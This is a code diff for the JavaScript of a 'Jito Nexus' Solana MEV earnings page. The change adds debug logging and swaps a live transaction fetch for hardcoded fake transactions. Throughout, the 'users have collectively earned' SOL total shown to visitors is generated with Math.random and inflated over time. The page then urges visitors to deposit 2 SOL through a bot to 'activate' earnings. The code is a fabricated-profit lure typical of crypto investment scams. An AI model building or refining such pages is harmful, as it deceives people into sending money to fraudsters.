@@ -2,15 +2,17 @@ let currentBalance = 0;
 let startTime = new Date();
 let chart;
 
-const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+console.log("Script loaded");
 
 document.addEventListener("DOMContentLoaded", function() {
+    console.log("DOM fully loaded");
     initializeApp();
     setInterval(updateApp, 1000); // Update every second
     setInterval(fetchRecentTransactions, 30000); // Fetch transactions every 30 seconds
 });
 
 function initializeApp() {
+    console.log("Initializing app");
     currentBalance = Math.random() * (16000 - 145) + 145;
     startTime = new Date();
     updateTodayStats();
@@ -24,6 +26,7 @@ function initializeApp() {
 function updateApp() {
     const now = new Date();
     if (now - startTime >= 24 * 60 * 60 * 1000) {
+        console.log("24 hours passed, resetting");
         initializeApp(); // Reset after 24 hours
     } else {
         updateTodayStats();
@@ -41,6 +44,8 @@ function updateTodayStats() {
     
     currentBalance += increase;
 
+    console.log("Updating stats, current balance:", currentBalance.toFixed(2));
+
     document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
     document.getElementById("stats-description").textContent = 
         `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
@@ -48,12 +53,14 @@ function updateTodayStats() {
 }
 
 function initializeWallet() {
+    console.log("Initializing wallet");
     document.getElementById("wallet-instructions").innerHTML = 
         "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type <strong>/get_wallet</strong>. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
     document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
 }
 
 function updateMyGains() {
+    console.log("Updating gains");
     const gainsContent = document.getElementById("gains-content");
     gainsContent.innerHTML = `
         <span class="lock-icon">🔒</span>
@@ -61,56 +68,19 @@ function updateMyGains() {
     `;
 }
 
-async function fetchRecentTransactions() {
-    try {
-        const signatures = await connection.getSignaturesForAddress(new solanaWeb3.PublicKey('Vote111111111111111111111111111111111111111'), { limit: 10 });
-        
-        const transactions = await Promise.all(signatures.map(async (sig) => {
-            const tx = await connection.getTransaction(sig.signature);
-            if (!tx) return null;
-
-            const { transaction, meta } = tx;
-            const isTransfer = transaction.instructions.some(ix => 
-                ix.programId.equals(solanaWeb3.SystemProgram.programId));
-            const isSwap = transaction.instructions.some(ix => 
-                ix.programId.toBase58() === 'SwaPpA9LAaLfeLi3a68M4DjnLqgtticKg6CnyNwgAC8');
-
-            let type, amount, fromAddress, toAddress;
-
-            if (isTransfer) {
-                type = 'transfer';
-                amount = meta.postBalances[0] - meta.preBalances[0];
-                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
-                toAddress = transaction.instructions[0].keys[1].pubkey.toBase58();
-            } else if (isSwap) {
-                type = 'swap';
-                amount = 'Token Swap';
-                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
-                toAddress = 'N/A';
-            } else {
-                type = 'other';
-                amount = 'Unknown';
-                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
-                toAddress = 'N/A';
-            }
-
-            return {
-                type,
-                amount: type === 'transfer' ? (Math.abs(amount) / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL' : amount,
-                time: new Date(tx.blockTime * 1000).toLocaleTimeString(),
-                fromAddress: fromAddress.slice(0, 4) + '...' + fromAddress.slice(-4),
-                toAddress: toAddress !== 'N/A' ? toAddress.slice(0, 4) + '...' + toAddress.slice(-4) : toAddress
-            };
-        }));
-
-        displayTransactions(transactions.filter(tx => tx !== null));
-    } catch (error) {
-        console.error("Error fetching recent transactions:", error);
-        document.getElementById("transactions-list").innerHTML = "Error fetching transactions";
-    }
+function fetchRecentTransactions() {
+    console.log("Fetching recent transactions");
+    // Simulated transactions for testing
+    const transactions = [
+        { type: 'transfer', amount: '5.3000 SOL', time: '15:30:45', fromAddress: '9nG3...', toAddress: 'Ai9n...' },
+        { type: 'swap', amount: 'Token Swap', time: '15:31:22', fromAddress: 'Bk7m...', toAddress: 'N/A' },
+        { type: 'other', amount: 'Unknown', time: '15:32:01', fromAddress: 'Cx2p...', toAddress: 'N/A' }
+    ];
+    displayTransactions(transactions);
 }
 
 function displayTransactions(transactions) {
+    console.log("Displaying transactions");
     const transactionsList = document.getElementById("transactions-list");
     transactionsList.innerHTML = "";
     transactions.forEach(tx => {
@@ -140,6 +110,7 @@ function displayTransactions(transactions) {
 }
 
 function showTab(tabId) {
+    console.log("Showing tab:", tabId);
     const tabs = document.getElementsByClassName("tab-content");
     for (let tab of tabs) {
         tab.classList.remove("active");
@@ -148,6 +119,7 @@ function showTab(tabId) {
 }
 
 function initializeStatsGraph() {
+    console.log("Initializing stats graph");
     const ctx = document.getElementById('stats-graph').getContext('2d');
     chart = new Chart(ctx, {
         type: 'line',
@@ -202,6 +174,7 @@ function initializeStatsGraph() {
 }
 
 function updateStatsGraph() {
+    console.log("Updating stats graph");
     const now = new Date();
     chart.data.datasets[0].data.push({x: now, y: currentBalance});
     if (chart.data.datasets[0].data.length > 100) {
